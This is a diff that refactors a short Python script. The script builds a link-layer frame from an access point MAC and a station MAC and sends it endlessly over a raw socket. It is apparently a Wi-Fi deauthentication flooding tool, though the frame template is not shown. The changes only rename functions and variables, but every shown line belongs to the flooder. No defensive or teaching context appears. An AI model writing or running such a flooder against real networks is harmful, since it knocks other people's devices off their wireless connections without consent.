@@ -15,20 +15,17 @@ def mac(string):
   return string.replace(':', str())
 
 
-def construct(wap, sta):
-    
-  frame = bytes.fromhex(template.format(mac(wap), mac(sta)))
-  return frame
+def frame(wap, sta):    
+  return bytes.fromhex(template.format(mac(wap), mac(sta)))
 
 
-def flood(iface, packet):
-  # use a raw socket to transmit link layer.
-
-  s = socket(AF_PACKET, SOCK_RAW, 0)
-  s.bind((iface, 0))
+def flood(iface, data):
+  
+  raw = socket(AF_PACKET, SOCK_RAW, 0)
+  raw.bind((iface, 0))
 
   while 1: 
-    s.send(packet)
+    raw.send(data)
 
 
 def start():
@@ -38,8 +35,8 @@ def start():
   print('@ sending frames...')
     
   try:
-    frame = construct(wap, sta)
-    flood(iface, frame)
+    data = frame(wap, sta)
+    flood(iface, data)
 
   except:
     return
